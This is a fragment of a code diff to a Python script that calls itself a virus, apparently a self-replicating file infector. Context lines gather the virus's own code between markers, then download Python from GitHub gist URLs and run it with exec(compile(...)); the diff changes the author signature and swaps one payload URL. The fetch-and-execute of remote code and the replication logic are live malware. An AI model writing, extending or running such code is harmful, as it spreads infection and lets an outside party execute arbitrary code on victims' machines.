@@ -16,14 +16,14 @@ for line in lines:
         virus_code.append(line)
     if line == "# VIRUS SAYS BYE!\n":
         break
-if 'sig = \'Virus.py by Narmak2\'' in lines:
+if 'sig = \'Virus.py by NarmakTwo on Github/NarmakTwo on Replit\'' in lines:
   fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/45ba9e421fdeb87ee3bb1a265d85f3e2/raw/62bfae6a810ecd6d3c9cb31bb961dfba489b86de/code.py")
   mybytes = fp.read()
   mystr = mybytes.decode("utf8")
   fp.close()
   exec(compile(mystr, 'exec', 'exec'))
 else:
-  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/b6ce28a66fe6af224c2fadba10efdf7c/raw/b363584b8dfb4168f636f6837d2d112f56770fb7/gistfile1.txt")
+  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/b6ce28a66fe6af224c2fadba10efdf7c/raw/e01e3cbbb48466ad4379ef6c11d416826244bab8/gistfile1.txt")
   mybytes = fp.read()
   mystr = mybytes.decode("utf8")
   fp.close()
